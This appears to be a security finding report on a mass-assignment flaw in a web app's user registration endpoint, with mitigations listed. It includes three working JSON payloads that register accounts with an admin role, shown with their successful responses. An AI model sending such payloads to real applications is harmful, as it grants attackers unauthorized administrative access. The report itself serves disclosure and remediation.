# Mass Assignment / Role Escalation via /api/Users Registration

## Vulnerability Class
Broken Access Control — Mass Assignment

## Endpoint
`POST /api/Users`

## Vulnerable Parameter
`role` (and `isActive`) in the JSON request body

## Description
The user registration endpoint accepts a `role` parameter in the request body and stores it directly in the database without any authorization check. A regular unauthenticated user can register with `role: "admin"` and obtain administrative privileges.

## Detection Payloads
- `{"email": "testadmin@test.com", "password": "TestPass123!", "role": "admin"}` → HTTP 201, response shows `"role":"admin"`, `"id":42`
- `{"email": "testmassassign@test.com", "password": "TestPass123!", "role": "admin", "isActive": true}` → HTTP 201, response shows `"role":"admin"`, `"isActive":true`, `"id":43`
- `{"email": "testdeluxe@test.com", "password": "TestPass123!", "role": "admin", "deluxeToken": "fake-deluxe-token"}` → HTTP 201, response shows `"role":"admin"`, `"deluxeToken":"fake-deluxe-token"`, `"id":44`

## Evidence
All three registration attempts returned HTTP 201 with the `role` field set to `"admin"` in the response body. The created users have `profileImage: "/assets/public/images/uploads/defaultAdmin.png"` and `isActive: true`.

## Impact
An attacker can escalate privileges to admin level by simply including `role: "admin"` in the registration request body. This grants full administrative access to the application.

## Mitigation
- Remove `role` and `isActive` from the list of acceptable registration fields on the server side
- Use a whitelist of allowed fields for user creation (never trust client-supplied role values)
- Set default role to `"customer"` server-side and ignore any `role` value in the request